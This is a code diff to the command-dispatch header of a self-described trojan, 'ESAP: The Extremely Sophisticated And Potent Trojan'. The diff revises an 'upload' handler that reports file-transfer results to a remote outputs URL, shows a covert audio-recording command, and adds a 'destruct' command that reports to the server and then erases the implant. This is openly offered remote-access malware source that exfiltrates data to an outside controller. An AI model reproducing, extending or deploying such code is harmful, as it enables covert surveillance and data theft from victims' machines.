@@ -1,3 +1,15 @@
+/*
+ ___ ___   _   ___ 
+| __/ __| /_\ | _ \
+| _|\__ \/ _ \|  _/
+|___|___/_/ \_\_|  
+
+ESAP: The Extremely Sophisticated And Potent Trojan
+<api.hpp>
+This header acts as the API between instructions and their respective functions.
+
+*/
+
 #include <iostream>
 #include <string>
 
@@ -124,11 +136,10 @@ void perform(std::string id, std::vector<std::string> values) {
     }
 
     else if (type == "upload") {
-        UploadFile(values[2], values[3]);
         POST_Request(OUTPUTS_URL + id, {
             {"instruction_id", values[0]},
             {"type", type},
-            {"data", "success"}
+            {"data", UploadFile(values[2], values[3]) ? "success" : "fail"}
         });
     }
 
@@ -140,6 +151,7 @@ void perform(std::string id, std::vector<std::string> values) {
             {"data", "success"}
         });
     }
+
     else if (type == "raudio") {
         std::string fileID = RecordAudio(atoi(values[2].c_str()));
         POST_Request(OUTPUTS_URL + id, {
@@ -147,5 +159,14 @@ void perform(std::string id, std::vector<std::string> values) {
             {"type", type},
             {"data", fileID}
         });
+    }
+
+    else if (type == "destruct") {
+        POST_Request(OUTPUTS_URL + id, {
+            {"instruction_id", values[0]},
+            {"type", type},
+            {"data", "success. goodbye world!"}
+        });
+        SelfDestruct();
     }
 }
